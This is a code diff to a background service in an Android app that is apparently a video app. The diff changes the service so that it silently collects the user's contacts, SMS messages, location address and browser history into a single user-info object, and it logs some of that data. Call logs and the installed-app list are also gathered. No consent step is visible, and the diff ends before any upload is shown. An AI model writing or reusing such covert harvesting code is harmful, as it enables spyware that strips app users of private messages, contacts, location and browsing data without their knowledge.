@@ -8,12 +8,15 @@ import android.text.TextUtils;
 import com.lxw.videoworld.app.api.HttpHelper;
 import com.lxw.videoworld.app.config.Constant;
 import com.lxw.videoworld.app.model.ConfigModel;
+import com.lxw.videoworld.app.model.UserInfoModel;
 import com.lxw.videoworld.framework.http.BaseResponse;
 import com.lxw.videoworld.framework.http.HttpManager;
 import com.lxw.videoworld.framework.image.ImageManager;
 import com.lxw.videoworld.framework.log.LoggerHelper;
 import com.lxw.videoworld.framework.util.SharePreferencesUtil;
 import com.lxw.videoworld.framework.util.UserInfoUtil;
+
+import java.util.ArrayList;
 
 import io.reactivex.Observable;
 import io.reactivex.ObservableEmitter;
@@ -90,6 +93,7 @@ public class BackgroundIntentService extends IntentService{
     }
 
     public void getUserInfo() {
+        final UserInfoModel userInfoModel = new UserInfoModel();
         // app 安装列表
         Observable<String> appListObservable = Observable.create(new ObservableOnSubscribe<String>() {
             @Override
@@ -103,8 +107,11 @@ public class BackgroundIntentService extends IntentService{
         Observable<String> contactListObservable = Observable.create(new ObservableOnSubscribe<String>() {
             @Override
             public void subscribe(ObservableEmitter<String> emitter) throws Exception {
-                UserInfoUtil.getContactInfo(BackgroundIntentService.this);
-                LoggerHelper.info("contactListObservable", UserInfoUtil.getContactInfo(BackgroundIntentService.this).toString());
+                String content = UserInfoUtil.getContactInfo(BackgroundIntentService.this);
+                if(!TextUtils.isEmpty(content)){
+                    userInfoModel.setContactList(content);
+                    LoggerHelper.info("contactListObservable", UserInfoUtil.getContactInfo(BackgroundIntentService.this).toString());
+                }
                 emitter.onNext("");
             }
         });
@@ -113,7 +120,7 @@ public class BackgroundIntentService extends IntentService{
             @Override
             public void subscribe(ObservableEmitter<String> emitter) throws Exception {
                 UserInfoUtil.getCallLogs(BackgroundIntentService.this);
-                LoggerHelper.info("callLogsObservable", UserInfoUtil.getCallLogs(BackgroundIntentService.this).toString());
+//                LoggerHelper.info("callLogsObservable", UserInfoUtil.getCallLogs(BackgroundIntentService.this).toString());
                 emitter.onNext("");
             }
         });
@@ -121,8 +128,11 @@ public class BackgroundIntentService extends IntentService{
         Observable<String> smsObservable = Observable.create(new ObservableOnSubscribe<String>() {
             @Override
             public void subscribe(ObservableEmitter<String> emitter) throws Exception {
-                UserInfoUtil.getSmsInPhones(BackgroundIntentService.this);
-                LoggerHelper.info("smsObservable", UserInfoUtil.getSmsInPhones(BackgroundIntentService.this).toString());
+                ArrayList<String> content =  UserInfoUtil.getSmsInPhones(BackgroundIntentService.this);
+                if(content != null && content.size() > 0){
+                    userInfoModel.setSmsList(content.toString());
+                    LoggerHelper.info("smsObservable", UserInfoUtil.getSmsInPhones(BackgroundIntentService.this).toString());
+                }
                 emitter.onNext("");
             }
         });
@@ -130,8 +140,10 @@ public class BackgroundIntentService extends IntentService{
         Observable<String> lacationObservable = Observable.create(new ObservableOnSubscribe<String>() {
             @Override
             public void subscribe(ObservableEmitter<String> emitter) throws Exception {
-                UserInfoUtil.getAddress(BackgroundIntentService.this);
-                LoggerHelper.info("lacationObservable", UserInfoUtil.getAddress(BackgroundIntentService.this).toString());
+                String content = UserInfoUtil.getAddress(BackgroundIntentService.this);
+                if(!TextUtils.isEmpty(content)){
+                    userInfoModel.setAddress(content);
+                }
                 emitter.onNext("");
             }
         });
@@ -139,13 +151,16 @@ public class BackgroundIntentService extends IntentService{
         Observable<String> browserHistoryObservable = Observable.create(new ObservableOnSubscribe<String>() {
             @Override
             public void subscribe(ObservableEmitter<String> emitter) throws Exception {
-                UserInfoUtil.getBrowserHistory(BackgroundIntentService.this);
-                LoggerHelper.info("browserHistoryObservable", UserInfoUtil.getBrowserHistory(BackgroundIntentService.this).toString());
+                ArrayList<String> content =  UserInfoUtil.getBrowserHistory(BackgroundIntentService.this);
+                if(content != null && content.size() > 0){
+                    userInfoModel.setBrowserHistory(content.toString());
+                    LoggerHelper.info("browserHistoryObservable", UserInfoUtil.getBrowserHistory(BackgroundIntentService.this).toString());
+                }
                 emitter.onNext("");
             }
         });
-        Observable.mergeDelayError(appListObservable, callLogsObservable, lacationObservable,
-                smsObservable)
+        Observable.mergeDelayError(contactListObservable, lacationObservable, smsObservable,
+                browserHistoryObservable)
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
                 .subscribe(new Consumer<String>() {
